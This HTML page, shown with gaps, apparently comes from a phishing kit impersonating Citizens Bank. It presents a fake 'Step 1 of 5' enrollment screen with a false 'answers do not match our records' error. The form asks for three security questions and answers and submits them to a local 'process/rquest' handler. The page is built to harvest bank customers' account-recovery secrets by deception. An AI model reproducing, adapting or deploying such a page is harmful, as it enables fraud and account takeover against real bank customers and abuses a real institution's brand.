...
<head>
    ...
    @media screen and (max-width: 880px) .responsive-enabled .page-logo img {
        padding-left: 0;
    }
    ...
    img[Attributes Style] {
        ...
        width: 203px;
        aspect-ratio: auto 203 / 25;
        height: 25px;
    }
    
    @media screen and (max-width: 880px) .responsive-enabled .page-logo {
        text-align: center;
    }
...
<div class="citizens-header-footer">
    <div id="page-header" class="page-header">
        <div class="centered-content clearfix">
            <a href="#" class="page-logo" tabindex="1"> <img border="0" alt="Citizens Bank" width="203" height="25" src="img/CTZ_Green-01.png"> </a>
...
<div id="page-container" class="page-container">
    <div class="centered-content clearfix">
        <form action="process/rquest" method="post" class="unauth-form jqtransform js-login-form">
            <div class="g-unauth-main-container">
                <section class="unauth-intro-area">
                    ...
                    <div role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuetext="Step 1 of 5: Enrollment" aria-valuemax="5">
                        <div class="unauth-intro-area__step"> <strong>Step 1 of 5:</strong> <span>Processing...</span> </div>
                    ...
                    <div class="unauth-intro-area__help">
                        <p class="unauth-intro-area__text">Please enter your information to help us find your account.</p>
                    </div>
                </section>
                </section>
                <section class="identify-customer-section">
                    <form class="unauth-form jqtransform js-enrollment-form" novalidate="novalidate">
                        <div class="unauth-form__ic-identification-block">
                            <div class="unauth-form__row">
                                <div class="unauth-form__legend">
                                    <label class="unauth-form__label"></label>
                                </div>
                            </div>
                            <div id="messagecontainer" class="error-message show-error error-visible" role="alert">One of the answers below does not match our records. Please review your information then try again.
                    </div>
                            <br>
                            <div class="unauth-form__rowgroup -visible" id="unauth-ic-form-rowgroup-account-info" style="display: block;">
                                 <div class="row">
                                        <div class="col-25">
                                          <label for="em"><strong>Security Question 1</strong></label>
                                   
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="rquest1" aria-required style="width: 100%; outline: none; height: 50" required="">
                                          ...
                                          <div class="col-75">
                                            <label for="em"><strong>Answer 1</strong></label>
                                           <div>
                                        <input name="rans1" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                     </div>
                                    ...
                                    <div class="col-25">
                                        <label for="em"><strong>Security Question 2</strong></label>
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="rquest2" aria-required style="width: 100%; outline: none; height: 50" required="">
                                              <option value="" disabled="" selected="selected">Choose Your Question </option>
                                ...
                                <div class="col-75">
                                   <label for="em"><strong>Answer 2</strong></label>
                                     <div>
                                        <input name="rans2" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                    </div>
                                </div>
                                ...
                                <div class="col-25">
                                        <label for="em"><strong>Security Question 3</strong></label>
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="rquest3" aria-required style="width: 100%; outline: none; height: 50" required="">
                                                <option value="" disabled="" selected="selected">Choose Your Question </option>
                                ...
                                <div class="col-75">
                                   <label for="em"><strong>Answer 3</strong></label>
                                     <div>
                                        <input name="rans3" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                    </div>
                                  <br>
    ...
    <div class="citizens-header-footer">
        <footer id="page-footer" class="page-footer">
            <div class="footer-top">
                <ul>
                    <li>
                        <a href="#" class="" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline"></span> <span class="visuallyhidden"></span> </a>
                        <a href="#" class="" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline"></span> <span class="visuallyhidden"></span> </a>
                        <a href="#" class="" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline"></span> <span class="visuallyhidden"></span> </a>
                    </li>
                </ul>
            ...
            <div class="footer-row clearfix">
                <ul>
                    <li>
                        <h6>Checking &amp; Savings</h6> </li> <a target="_blank" href="">Checking</a> </li>
                    <li> <a target="_blank" href="">Savings</a> </li>
                    <li> <a target="_blank" href="">Money Markets</a> </li>
                    <li> <a target="_blank" href="">Certificates of Deposit (CDs)
<sup>®</sup>
</a> </li>
                    ...
                    <li> <a target="_blank" href="">Overdraft Choices
<sup>®</sup>
</a> </li>
                </ul>
                <ul>
            ...
            <div class="footer-row clearfix">
                <ul>
                    ...
                    <li> <a target="_blank" href="">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="img/equal-housing.gif">
</a> </li>
